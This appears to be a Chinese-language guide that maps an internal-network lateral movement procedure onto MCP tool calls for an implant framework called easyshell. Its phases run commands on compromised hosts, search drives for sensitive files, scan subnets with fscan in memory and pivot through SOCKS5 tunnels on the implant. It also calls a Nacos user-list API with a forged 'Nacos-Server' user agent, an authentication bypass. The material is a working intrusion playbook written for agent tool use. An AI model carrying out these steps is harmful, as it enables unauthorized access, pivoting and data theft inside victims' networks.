# easyshell-lateral → easyshell-mcp 对接指南

将内网横向 SOP 翻译成 easyshell-mcp 工具调用，用 MCP 代替裸 HTTP 调加密 API。

---

## 工具名映射

| 横向 SOP 步骤 | easyshell-mcp 工具 | 说明 |
|---------------|-------------------|------|
| 列在线植入体 | `easyshell_list_clients()` | `uid` 为字符串 |
| 执行命令 | `easyshell_exec_cmd(uid, command)` | 合并为一条 `cmd /c "a&b&c"` |
| 读文件 | `easyshell_read_file(uid, path)` | 完整路径，如 `C:/r.txt` |
| 列目录 | `easyshell_list_dir(uid, path)` | |
| 内存执行 fscan | `easyshell_memory_exec(uid, rel_path, "inline-bin", args)` | 不落盘 |
| 建 SOCKS5 | `easyshell_start_socks5(uid, port, force=True)` | 出口 = 植入体 IP |
| 停 SOCKS5 | `easyshell_stop_socks5(uid, port)` | 用完即关 |
| 隧道探测 | `easyshell_tunnel_curl(port, url)` | 本机 curl |
| 敏感文件搜索 | `easyshell_search_sensitive(uid, path)` | 等 30s 后 `list_sensitive` |
| Nacos 直连 | `easyshell_send_http(url, headers=...)` | 不经植入体 |

---

## Phase 1：端口 → 进程

```
easyshell_list_clients()
easyshell_exec_cmd(uid, 'cmd /c "netstat -ano | findstr LISTENING&tasklist"')
```

---

## Phase 2：敏感信息

```
easyshell_search_sensitive(uid, "C:/")
# 等 30–60 秒
easyshell_list_sensitive(uid)
easyshell_read_sensitive(result_id)
```

---

## Phase 3：fscan 扫描

```
easyshell_memory_exec(uid, "easyshell_plugins/tools/fscan.exe", "inline-bin", "-h 192.168.1.0/24 -np -o C:/scan.txt")
# 等 10–15 秒
easyshell_read_file(uid, "C:/scan.txt")
```

---

## Phase 4：隧道 + 本机打内网

```
easyshell_start_socks5(uid, port=1080, force=True)
easyshell_tunnel_test(uid, 1080)
easyshell_tunnel_curl(1080, "http://192.168.1.10:8848/nacos/")
easyshell_stop_socks5(uid, 1080)
```

本机能直连时优先：

```
easyshell_send_http("http://目标:8848/nacos/v1/auth/users?pageNo=1&pageSize=10", headers="User-Agent: Nacos-Server")
```

---

## API 差异备忘

- 植入体 ID 用 **字符串 uid**
- API **必须加密**，只用 MCP 或 `easyshell_api.py`
- 读文件传 **完整 path**

完整 SOP 见同目录 `skill.md`。
